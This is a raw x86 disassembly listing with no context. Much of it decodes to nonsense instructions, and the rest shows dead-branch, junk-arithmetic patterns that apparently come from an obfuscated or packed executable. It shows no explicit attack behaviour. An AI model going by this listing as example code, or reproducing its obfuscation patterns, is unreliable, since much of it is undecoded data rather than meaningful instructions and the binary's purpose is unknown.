  401840:	cmp    DWORD PTR [eax],0xb6bd6db2
  401846:	sbb    eax,0xf77c8c80
  40184b:	pop    edx
  40184c:	jns    0x4017f0
  40184e:	out    0x4c,eax
  401850:	out    dx,al
  401851:	mov    bl,0x1
  401853:	cli    
  401854:	sbb    ebx,ecx
  401856:	aad    0xed
  401858:	(bad)
  40185b:	push   cs
  40185c:	out    0x68,al
  40185e:	scas   al,BYTE PTR es:[edi]
  40185f:	add    esp,DWORD PTR ds:0xf920abac
  401865:	mov    bl,0xa9
  401867:	sub    al,0xc
  401869:	xchg   edx,eax
  40186a:	in     eax,dx
  40186b:	stos   DWORD PTR es:[edi],eax
  40186c:	pop    eax
  40186d:	mov    ebx,0x92bdef23
  401872:	sbb    cl,dl
  401874:	jle    0x4018e7
  401876:	js     0x401892
  401878:	aaa    
  401879:	mov    eax,0xd38e2c5b
  40187e:	push   ds
  40187f:	fcmove st,st(2)
  401881:	mov    esp,0x1662ea1b
  401886:	push   ebp
  401887:	sub    al,0xa1
  401889:	or     esp,DWORD PTR [esi+edx*4+0x68cb3aa1]
  401890:	addr16 daa 
  401892:	repnz xchg ebx,eax
  401894:	and    BYTE PTR [ecx-0x53],al
  401897:	in     al,0x5
  401899:	in     al,0x54
  40189b:	ret    0x9750
  40189e:	jbe    0x4018ef
  4018a0:	mov    al,ds:0x69dbdb26
  4018a5:	out    0x5d,eax
  4018a7:	mov    ah,0x85
  4018a9:	cmp    BYTE PTR [ebp-0x37],al
  4018ac:	mov    al,ds:0xc2d17275
  4018b1:	adc    eax,DWORD PTR [edi+0x7d]
  4018b4:	ficom  DWORD PTR [esi-0x33]
  4018b7:	cld    
  4018b8:	pop    ebp
  4018b9:	dec    ecx
  4018ba:	or     eax,0xfc6282bd
  4018bf:	scas   al,BYTE PTR es:[edi]
  4018c0:	es or  eax,0xc28092a0
  4018c6:	loop   0x40191a
  4018c8:	xor    dh,BYTE PTR [esi]
  4018ca:	test   BYTE PTR [esi],bl
  4018cc:	aad    0x56
  4018ce:	adc    BYTE PTR [eax+edi*8-0x64],ch
  4018d2:	stc    
  4018d3:	pop    eax
  4018d4:	push   ebx
  4018d5:	mov    ebx,0x36623b2f
  4018da:	xchg   ebp,eax
  4018db:	pop    ebx
  4018dc:	bound  esp,QWORD PTR [esi-0x55]
  4018df:	(bad)  
  4018e0:	sbb    BYTE PTR [edx],ch
  4018e2:	mov    al,ds:0xe1f948e4
  4018e7:	enter  0xd75d,0x70
  4018eb:	inc    eax
  4018ec:	pop    ebp
  4018ed:	sub    BYTE PTR [edi-0x31],0x8f
  4018f1:	sbb    DWORD PTR [edx-0x31d9faf1],ebp
  4018f7:	fild   DWORD PTR [ecx-0x480243ab]
  4018fd:	inc    ebx
  4018fe:	(bad)  
  4018ff:	pusha  
  401900:	popf   
  401901:	or     dl,BYTE PTR [ebx+0x6f]
  401904:	jo     0x4018f1
  401906:	popf   
  401907:	fs mov ah,0xb7
  40190a:	cld    
  40190b:	push   esp
  40190c:	sub    edx,DWORD PTR [edi]
  40190e:	mov    ebp,0x6dd29fee
  401913:	popa   
  401914:	dec    ebx
  401915:	int3   
  401916:	lods   al,BYTE PTR ds:[esi]
  401917:	outs   dx,BYTE PTR ds:[esi]
  401918:	imul   esp,edi,0xc8f41c93
  40191e:	fs inc eax
  401920:	add    DWORD PTR [edx+0x61],edi
  401923:	jp     0x40198d
  401925:	adc    ebx,DWORD PTR [ebx]
  401927:	cmp    al,0x68
  401929:	or     esi,DWORD PTR [esi+0xfc3b28b]
  40192f:	push   ss
  401930:	inc    edx
  401931:	jae    0x4018ca
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x4282d7,0x0
  401946:	not    DWORD PTR ds:0x42834f
  40194c:	mov    edi,DWORD PTR ds:0x4281f3
  401952:	mov    DWORD PTR ds:0x4282ef,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x42835b,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x4282d7,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428ddc
  401981:	mov    edx,DWORD PTR ds:0x4283f7
  401987:	adc    DWORD PTR ds:0x42835f,edx
  40198d:	and    edx,DWORD PTR ds:0x4282af
  401993:	add    DWORD PTR ds:0x4282df,edx
  401999:	mov    edi,DWORD PTR ds:0x4281d3
  40199f:	xor    DWORD PTR ds:0x4281fb,edi
  4019a5:	and    DWORD PTR ds:0x4281cb,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x4283db
  4019b4:	sub    ecx,DWORD PTR ds:0x4282db
  4019ba:	mov    DWORD PTR ds:0x4283db,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x4283eb,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x4283e3,0x339b
  4019e6:	mov    eax,ds:0x422430
  4019eb:	cmp    DWORD PTR ds:0x4282c7,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x4282d7
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x4282c7,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x4282e7
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428ec8
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x4281e7
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x4281d7
  401a44:	sub    DWORD PTR ds:0x428363,ecx
  401a4a:	add    DWORD PTR ds:0x4281e3,0x4282db
  401a54:	xor    edx,DWORD PTR ds:0x42834b
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x4281f3,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x4281f3,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x4282c7
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x42837f,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x4282cb,0x206f
  401a9e:	cmp    DWORD PTR ds:0x4281f3,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428de0
  401ac0:	sub    edx,DWORD PTR ds:0x428403
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x4283ef
  401ad4:	adc    ecx,DWORD PTR ds:0x4281df
  401ada:	mov    DWORD PTR ds:0x4283ef,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x4281db
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x4281c3,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x4282d7,0x6ba0
  401b03:	mov    DWORD PTR ds:0x4281ef,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x4281cf,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x4281c3,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428f30
  401b3a:	movzx  edx,WORD PTR ds:0x4282ff
  401b41:	and    edx,DWORD PTR ds:0x4281db
  401b47:	mov    DWORD PTR ds:0x4282ff,edx
  401b4d:	and    DWORD PTR ds:0x4282b7,edx
  401b53:	add    DWORD PTR ds:0x4283fb,edx
  401b59:	sub    edx,DWORD PTR ds:0x428303
  401b5f:	add    DWORD PTR ds:0x4282bb,edi
  401b65:	or     edx,DWORD PTR ds:0x4283e7
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x42836b,0x0
  401b78:	mov    DWORD PTR ds:0x428303,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x4281d3,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x4282a7
  401ba1:	cmp    DWORD PTR ds:0x42836b,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428df4
  401bc7:	sub    DWORD PTR ds:0x428357,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x4282bb
  401bd4:	add    DWORD PTR ds:0x428367,edx
  401bda:	add    DWORD PTR ds:0x4281bf,ebx
  401be0:	sbb    DWORD PTR ds:0x42828f,edi
  401be6:	inc    DWORD PTR ds:0x42828f
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x4283f3,0x428297
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0x44b0afeb
  401c11:	dec    ebx
  401c12:	push   ebx
  401c13:	stos   BYTE PTR es:[edi],al
  401c14:	and    eax,0x9e18180a
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    BYTE PTR [eax],dl
  401c1d:	push   ss
  401c1e:	add    esp,DWORD PTR [edi]
  401c20:	mov    ch,0xd5
  401c22:	jmp    0x401be0
  401c24:	int3   
  401c25:	cmp    eax,0xaecd799f
  401c2a:	stos   DWORD PTR es:[edi],eax
  401c2b:	push   es
  401c2c:	lods   eax,DWORD PTR ds:[esi]
  401c2d:	sbb    dh,BYTE PTR [ebx]
  401c2f:	sbb    al,0xa5
  401c31:	in     eax,dx
  401c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c33:	inc    ebx
  401c34:	dec    edi
  401c35:	xor    DWORD PTR [esi+ecx*8+0x71da7a86],edi
  401c3c:	je     0x401c01
  401c3e:	pop    esp
  401c3f:	pop    ss
  401c40:	pop    edi
  401c41:	les    edx,FWORD PTR [ebx+esi*2-0x2]
  401c45:	push   ecx
  401c46:	dec    edx
  401c47:	push   esi
  401c48:	inc    edx
  401c49:	in     al,dx
  401c4a:	mov    BYTE PTR fs:0x88f3b15d,ah
  401c51:	inc    esi
  401c52:	and    al,0x2c
  401c54:	call   0xddd5f052
  401c59:	mov    cl,0x62
  401c5b:	lods   al,BYTE PTR ds:[esi]
  401c5c:	fldcw  WORD PTR [ecx+ebx*8]
  401c5f:	popf   
  401c60:	mov    BYTE PTR [ecx-0x58],ch
  401c63:	(bad)  
  401c64:	mov    esp,0x601ce98e
  401c69:	outs   dx,DWORD PTR ds:[esi]
  401c6a:	fwait
  401c6b:	sbb    cl,al
  401c6d:	jmp    DWORD PTR [ecx+0x61]
  401c70:	scas   eax,DWORD PTR es:[edi]
  401c71:	add    edx,ebp
  401c73:	ins    BYTE PTR es:[edi],dx
  401c74:	add    DWORD PTR [edi-0x3a],ebp
  401c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c78:	test   DWORD PTR [edx+0x5d],edi
  401c7b:	aaa    
  401c7c:	imul   edx,DWORD PTR [ecx],0xa761769c
  401c82:	jnp    0x401cc0
  401c84:	shl    DWORD PTR gs:[eax+ebp*2-0x46],cl
  401c89:	jge    0x401c72
  401c8b:	mov    ds:0xb51b3369,al
  401c90:	pop    esp
  401c91:	xor    bh,ah
  401c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c94:	(bad)  
  401c95:	nop
  401c96:	push   0xd
  401c98:	pop    es
  401c99:	dec    ebx
  401c9a:	add    esi,0xffffffc9
  401c9d:	lahf   
  401c9e:	test   DWORD PTR [esi-0x3b22c899],esp
  401ca4:	jb     0x401cd5
  401ca6:	shl    DWORD PTR [ebp+0x37a30f7a],1
  401cac:	out    dx,al
  401cad:	(bad)  
  401cae:	jg     0x401c61
  401cb0:	loop   0x401c55
  401cb2:	arpl   WORD PTR ss:[edi-0x72d98aaf],bx
  401cb9:	lahf   
  401cba:	pop    edx
  401cbb:	shl    BYTE PTR [ebp-0x79],1
  401cbe:	mov    esi,0x58179528
  401cc3:	dec    ebp
  401cc4:	jbe    0x401cf8
  401cc6:	out    dx,al
  401cc7:	(bad)
  401cca:	push   0x7f
  401ccc:	push   0xdc8277f3
  401cd1:	and    DWORD PTR [ecx+eax*4+0x16d0cb01],edi
  401cd8:	mov    DWORD PTR [edx-0x61],ebx
  401cdb:	jne    0x401c79
  401cdd:	ficomp DWORD PTR [eax-0x11]
  401ce0:	jne    0x401c83
  401ce2:	(bad)  
  401ce3:	nop
  401ce4:	aaa    
  401ce5:	xchg   ecx,eax
  401ce6:	inc    ecx
  401ce7:	aam    0x91
  401ce9:	pop    ebx
  401cea:	fmul   DWORD PTR [esi]
  401cec:	es loope 0x401cea
  401cef:	arpl   dx,ax
  401cf1:	xor    eax,0x6250c233
  401cf6:	xor    DWORD PTR [esi],0x7c
  401cf9:	push   0xffffffd6
  401cfb:	repnz (bad) 
  401cfd:	fidivr WORD PTR [esi]
  401cff:	xor    BYTE PTR [esp+ebx*8-0x7d636174],ah
  401d06:	mov    DWORD PTR [ecx+ebx*2+0x69],ebp
  401d0a:	dec    esp
  401d0b:	jb     0x401d80
  401d0d:	mov    eax,0x451231e1
  401d12:	or     eax,0x58bb7e85
  401d17:	add    al,0x4a
  401d19:	and    BYTE PTR [edx+0x67cc069b],bl
  401d1f:	ja     0x401ca4
  401d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d22:	jo     0x401cd2
  401d24:	jmp    0x401cdd
  401d26:	dec    edi
  401d27:	xor    DWORD PTR [ebx],0x33
  401d2a:	pop    edx
  401d2b:	outs   dx,BYTE PTR ds:[esi]
  401d2c:	repz rcr BYTE PTR [edi-0x19],cl
  401d30:	fist   WORD PTR [ebp-0xf]
  401d33:	mov    eax,0x993c85f6
  401d38:	pop    eax
  401d39:	mov    edx,esp
  401d3b:	rcl    ch,cl
  401d3d:	lods   eax,DWORD PTR ds:[esi]
  401d3e:	cwde   
  401d3f:	push   esi
  401d40:	ret    
  401d41:	ficomp DWORD PTR [ebp+0x6aa23233]
  401d47:	gs sti 
  401d49:	cmp    ah,BYTE PTR [edx]
  401d4b:	out    dx,eax
  401d4c:	or     esi,ecx
  401d4e:	ffree  st(1)
  401d50:	and    esp,DWORD PTR ds:0x66493d41
  401d56:	call   0xfcc030b9
  401d5b:	mov    eax,0x96807e9c
  401d60:	sbb    bl,BYTE PTR [esi]
  401d62:	jnp    0x401d64
  401d64:	pop    ebp
  401d65:	xchg   esi,eax
  401d66:	cld    
  401d67:	nop    DWORD PTR [ebp-0x148d0a1b]
  401d6e:	cs data16 cs lahf 
  401d72:	rcl    BYTE PTR gs:[esi+0x5a638737],cl
  401d79:	leave  
  401d7a:	mov    ch,0x4e
  401d7c:	repnz mov ah,0xa1
  401d7f:	test   bl,al
  401d81:	ficom  WORD PTR [edi]
  401d83:	pop    ebp
  401d84:	sub    bl,dl
  401d86:	shl    DWORD PTR [ebp-0x4526a2f0],0x4b
  401d8d:	xor    eax,0x4e81967e
  401d92:	jle    0x401ddd
  401d94:	ja     0x401d88
  401d96:	mov    ah,0xf8
  401d98:	inc    esi
  401d99:	or     edx,0xb45e992d
  401d9f:	aaa    
  401da0:	(bad)  
  401da1:	cmp    eax,0x81e0a054
  401da6:	jnp    0x401d2e
  401da8:	add    al,0xc4
  401daa:	push   edx
  401dab:	dec    edi
  401dac:	idiv   bh
  401dae:	int    0xc
  401db0:	jmp    0x1cbe:0x515d42f8
  401db7:	out    dx,eax
  401db8:	popa   
  401db9:	xchg   esp,eax
  401dba:	out    0x74,al
  401dbc:	aaa    
  401dbd:	mov    cl,0xce
  401dbf:	outs   dx,BYTE PTR ds:[esi]
  401dc0:	push   eax
  401dc1:	(bad)  
  401dc2:	ins    BYTE PTR es:[edi],dx
  401dc3:	jo     0x401ded
  401dc5:	hlt    
  401dc6:	push   ebx
  401dc7:	jmp    0x3719c282
  401dcc:	in     eax,0x95
  401dce:	adc    BYTE PTR [eax-0x5b],ch
  401dd1:	lock arpl di,sp
  401dd4:	scas   al,BYTE PTR es:[edi]
  401dd5:	loopne 0x401d82
  401dd7:	call   0x330:0x248794a
  401dde:	inc    DWORD PTR [esi]
  401de0:	cwde   
  401de1:	aad    0x93
  401de3:	xchg   edi,eax
  401de4:	hlt    
  401de5:	in     eax,dx
  401de6:	cmp    dh,cl
  401de8:	or     eax,0xde606c6
  401ded:	sbb    esi,DWORD PTR [esi]
  401def:	mov    ?,WORD PTR [edx-0x1f]
  401df2:	push   ecx
  401df3:	lahf   
  401df4:	and    al,0xda
  401df6:	dec    DWORD PTR [esi-0x1216cf3]
  401dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dfd:	push   eax
  401dfe:	retf   
  401dff:	ror    DWORD PTR [edx],1
  401e01:	push   ss
  401e02:	mov    edx,0xdebdc8c4
  401e07:	cwde   
  401e08:	fadd   QWORD PTR [edx+0x34]
  401e0b:	(bad)  
  401e0c:	aam    0x6a
  401e0e:	adc    al,0x38
  401e10:	(bad)  
  401e11:	mov    WORD PTR [ebp+0x2e],?
  401e14:	repnz cld 
  401e16:	pop    es
  401e17:	(bad)  
  401e18:	cld    
  401e19:	push   ss
  401e1a:	sub    DWORD PTR [edx+0x28c13742],ecx
  401e20:	jl     0x401de0
  401e22:	jae    0x401e71
  401e24:	push   eax
  401e25:	rcr    DWORD PTR [eax-0x473d4e34],0x67
  401e2c:	inc    eax
  401e2d:	aam    0xec
  401e2f:	push   ds
  401e30:	add    eax,0x36ff356b
  401e35:	jne    0x401e90
  401e37:	mov    cl,0xb3
  401e39:	dec    ebp
  401e3a:	lds    edx,FWORD PTR [eax+0x48e28163]
  401e40:	cdq    
  401e41:	adc    eax,0x4f1c2b94
  401e46:	adc    bh,BYTE PTR ds:0xcaccd34e
  401e4c:	or     ebx,edi
  401e4e:	lea    esp,[eax+0x39]
  401e51:	iret   
  401e52:	mov    cs,WORD PTR [esi-0x39dc3d37]
  401e58:	xor    ah,0x60
  401e5b:	mov    esp,0x7ff830cb
  401e60:	inc    ecx
  401e61:	cwde   
  401e62:	int3   
  401e63:	scas   eax,DWORD PTR es:[edi]
  401e64:	stc    
  401e65:	lods   al,BYTE PTR ds:[esi]
  401e66:	sar    BYTE PTR [eax],cl
  401e68:	ins    BYTE PTR es:[edi],dx
  401e69:	adc    DWORD PTR [bp+si+0x4437],esi
  401e6e:	push   0xffffff8d
  401e70:	ds (bad) 
  401e72:	push   esi
  401e73:	cmp    al,0x28
  401e75:	test   DWORD PTR [eax+0x5e95d1ac],eax
  401e7b:	shl    dl,1
  401e7d:	pop    edx
  401e7e:	mov    cl,0x69
  401e80:	outs   dx,BYTE PTR ds:[esi]
  401e81:	push   0xffffff9b
  401e83:	add    al,0x53
  401e85:	jnp    0x401e67
  401e87:	data16 adc al,0xe2
  401e8a:	inc    eax
  401e8b:	dec    ecx
  401e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8d:	push   ds
  401e8e:	or     esi,DWORD PTR [eax]
  401e90:	lods   al,BYTE PTR ds:[esi]
  401e91:	add    eax,0x8760b65d
  401e96:	dec    edi
  401e97:	sub    eax,0x3aa6f67d
  401e9c:	mov    al,cl
  401e9e:	icebp  
  401e9f:	bound  eax,QWORD PTR [ebx+0x2f]
  401ea2:	arpl   WORD PTR [esi-0x7f],bp
  401ea5:	out    0xf5,eax
  401ea7:	data16 sti 
  401ea9:	cmp    al,0x66
  401eab:	fist   DWORD PTR [eax-0x6d]
  401eae:	sub    eax,0xc076a6d3
  401eb3:	mov    edi,0x371412a3
  401eb8:	inc    edx
  401eb9:	sbb    bh,ch
  401ebb:	mov    edi,0x908fe8b
  401ec0:	imul   eax,eax,0x69
  401ec3:	sub    ch,BYTE PTR [edi+eiz*2+0x1]
  401ec7:	test   al,0x57
  401ec9:	out    0x98,eax
  401ecb:	mov    ebp,0xf4ca643a
  401ed0:	adc    al,0xbf
  401ed2:	repnz fwait
  401ed4:	repnz cdq 
  401ed6:	jns    0x401f46
  401ed8:	mov    bh,0x3e
  401eda:	lahf   
  401edb:	mov    edx,0x64d69dc3
  401ee0:	clc    
  401ee1:	outs   dx,DWORD PTR ds:[esi]
  401ee2:	(bad)  
  401ee3:	inc    ecx
  401ee4:	jne    0x401eb4
  401ee6:	lahf   
  401ee7:	mov    cl,BYTE PTR [eax+0x3b]
  401eea:	aas    
  401eeb:	imul   eax,eax,0xd4bbd371
  401ef1:	ret    
  401ef2:	inc    esp
  401ef3:	outs   dx,DWORD PTR ds:[esi]
  401ef4:	push   edx
  401ef5:	inc    eax
  401ef6:	sbb    di,WORD PTR [edx]
  401ef9:	and    BYTE PTR [ecx+ebp*4],al
  401efc:	pop    ds
  401efd:	fild   WORD PTR [esi+0x2a6e9b08]
  401f03:	sub    esi,DWORD PTR [ebx]
  401f05:	nop
  401f06:	mov    ds:0x24848447,al
  401f0b:	add    DWORD PTR [ebp+0xd],ecx
  401f0e:	sbb    ebx,edx
  401f10:	cld    
  401f11:	pop    eax
  401f12:	sbb    bl,BYTE PTR [edx-0x31]
  401f15:	dec    edx
  401f16:	aas    
  401f17:	jo     0x401eec
  401f19:	xchg   ebp,eax
  401f1a:	xor    BYTE PTR [edx],ah
  401f1c:	loopne 0x401f8a
  401f1e:	cmp    ecx,ecx
  401f20:	fnstsw WORD PTR [ecx+eiz*4-0x33]
  401f24:	aas    
  401f25:	push   esp
  401f26:	xor    DWORD PTR [ecx+0x1eacd968],0x3e0c928e
  401f30:	push   ds
  401f31:	mov    al,0xca
  401f33:	pop    edi
  401f34:	mov    DWORD PTR [ebx],ebp
  401f36:	or     edi,ecx
  401f38:	dec    ebx
  401f39:	sbb    dl,BYTE PTR [ecx-0x91b6b6a]
  401f3f:	dec    esi
  401f40:	inc    eax
  401f41:	inc    ebp
  401f42:	sub    BYTE PTR [edi],dh
  401f44:	pop    ecx
  401f45:	xor    eax,0x865a1031
  401f4a:	in     eax,dx
  401f4b:	retf   0x76ce
  401f4e:	jns    0x401fad
  401f50:	add    esp,DWORD PTR [esi+0x57f21b86]
  401f56:	mov    ebx,0xb405bfab
  401f5b:	mov    dl,0xe4
  401f5d:	mov    ch,0x8b
  401f5f:	inc    esp
  401f60:	rol    DWORD PTR [ecx+ebp*1-0x1f],cl
  401f64:	neg    DWORD PTR [esi]
  401f66:	ret    
  401f67:	inc    DWORD PTR [eax-0x34a4fb94]
  401f6d:	stos   DWORD PTR es:[edi],eax
  401f6e:	nop    edx
  401f71:	sub    BYTE PTR [ebp+0x16da9650],0xc7
  401f78:	sbb    eax,DWORD PTR [ecx+0x15601567]
  401f7e:	iret   
  401f7f:	mov    eax,ds:0x85dd0de3
  401f84:	sub    BYTE PTR [ecx],0xa5
  401f87:	adc    al,0xd3
  401f89:	jno    0x401f15
  401f8b:	xchg   edx,eax
  401f8c:	xor    ecx,DWORD PTR [edi+edi*8-0x60c91a92]
  401f93:	les    esi,FWORD PTR [ebx-0xf901cd6]
  401f99:	mov    gs,WORD PTR [ecx-0x56]
  401f9c:	aaa    
  401f9d:	and    DWORD PTR [eax],ecx
  401f9f:	jmp    0xd570bfc4
  401fa4:	das    
  401fa5:	mov    edi,0xbf530d16
  401faa:	int    0x78
  401fac:	mov    dl,0x2d
  401fae:	mov    ebx,0x55fb1156
  401fb3:	jle    0x402034
  401fb5:	mov    ecx,0x5d79604a
  401fba:	sub    al,0xaa
  401fbc:	add    eax,0x81977f65
  401fc1:	jbe    0x9f0de06c
  401fc7:	test   al,0xe9
  401fc9:	je     0x401fad
  401fcb:	xor    DWORD PTR [edx+0x47f8c7aa],0xffffff91
  401fd2:	jg     0x40200c
  401fd4:	push   ebp
  401fd5:	je     0x402036
  401fd7:	clc    
  401fd8:	inc    edx
  401fd9:	jnp    0x401fe6
  401fdb:	pop    ss
  401fdc:	inc    esp
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x4283cb
  401fec:	adc    DWORD PTR ds:0x428407,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x4283eb,0x0
  402000:	mov    DWORD PTR ds:0x4282eb,0x4df8
  40200a:	mov    DWORD PTR ds:0x4283d3,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x4283eb,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428df8
  40203e:	or     DWORD PTR ds:0x4281cf,0x6f29
  402048:	xor    DWORD PTR ds:0x42836b,0x42835f
  402052:	add    DWORD PTR ds:0x4282eb,0x428387
  40205c:	and    DWORD PTR ds:0x4283fb,edi
  402062:	mov    DWORD PTR ds:0x4282db,0x2a04
  40206c:	sub    DWORD PTR ds:0x4281fb,0x4281bb
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x42834f,0x0
  402084:	mov    DWORD PTR ds:0x42834b,ecx
  40208a:	mov    DWORD PTR ds:0x4281f7,0x59f
  402094:	mov    DWORD PTR ds:0x4281f7,ecx
  40209a:	mov    DWORD PTR ds:0x428377,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x42834f,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x4281cb
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428f34
  4020ce:	sbb    DWORD PTR ds:0x4283db,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x42835b,0x4282cf
  4020e2:	adc    DWORD PTR ds:0x4283cf,0x4c73
  4020ec:	add    DWORD PTR ds:0x4283cf,0x4283ff
  4020f6:	and    DWORD PTR ds:0x4281b7,0x4283d3
  402100:	sbb    DWORD PTR ds:0x4281bb,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x42834f,0x4282ff
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x42834b
  40213c:	add    DWORD PTR ds:0x4282e7,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x4283db
  40214e:	add    DWORD PTR ds:0x428377,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x4281c7,0x0
  402162:	mov    DWORD PTR ds:0x4283eb,0x750f
  40216c:	not    DWORD PTR ds:0x4283d3
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x4282cb,0x610f
  402181:	mov    eax,ds:0x4281df
  402186:	cmp    DWORD PTR ds:0x4281c7,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x4280c9
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428ed0
  4021b1:	adc    DWORD PTR ds:0x4282ef,0x4282c3
  4021bb:	add    DWORD PTR ds:0x4282af,0x168f
  4021c5:	sub    DWORD PTR ds:0x428353,0x4281f3
  4021cf:	or     DWORD PTR ds:0x4283f3,0xa53
  4021d9:	mov    eax,ds:0x4282a7
  4021de:	xor    DWORD PTR ds:0x4281bb,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0x6af6cb98
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
  402208:	sbb    BYTE PTR [esi-0x41e7e7ee],bl
  40220e:	push   ss
